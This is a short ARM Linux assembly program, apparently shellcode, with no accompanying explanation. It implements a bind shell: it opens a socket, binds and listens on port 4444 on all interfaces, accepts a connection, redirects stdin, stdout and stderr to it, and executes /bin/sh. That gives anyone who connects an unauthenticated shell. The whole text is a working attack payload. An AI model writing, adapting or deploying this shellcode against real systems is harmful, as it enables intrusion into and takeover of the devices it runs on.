.syntax unified
.arm
.global _start
_start:
    adr   r5, binsh
    mov   r0, #2
    mov   r1, #1
    eor   r2, r2, r2
    mov   r7, #281
    svc   #0
    mov   r6, r0
    sub   sp, sp, #16
    mov   r1, #2
    strh  r1, [sp]
    movw  r1, #0x5C11
    strh  r1, [sp, #2]
    str   r2, [sp, #4]
    mov   r0, r6
    mov   r1, sp
    mov   r2, #16
    mov   r7, #282
    svc   #0
    mov   r0, r6
    mov   r1, #1
    mov   r7, #284
    svc   #0
    mov   r0, r6
    eor   r1, r1, r1
    eor   r2, r2, r2
    mov   r7, #285
    svc   #0
    mov   r6, r0
    mov   r0, r6
    eor   r1, r1, r1
    mov   r7, #63
    svc   #0
    mov   r0, r6
    mov   r1, #1
    mov   r7, #63
    svc   #0
    mov   r0, r6
    mov   r1, #2
    mov   r7, #63
    svc   #0
    adr   r0, binsh
    sub   sp, sp, #8
    str   r0, [sp]
    eor   r1, r1, r1
    str   r1, [sp, #4]
    mov   r1, sp
    eor   r2, r2, r2
    mov   r7, #11
    svc   #0
binsh:
    .asciz "/bin/sh"
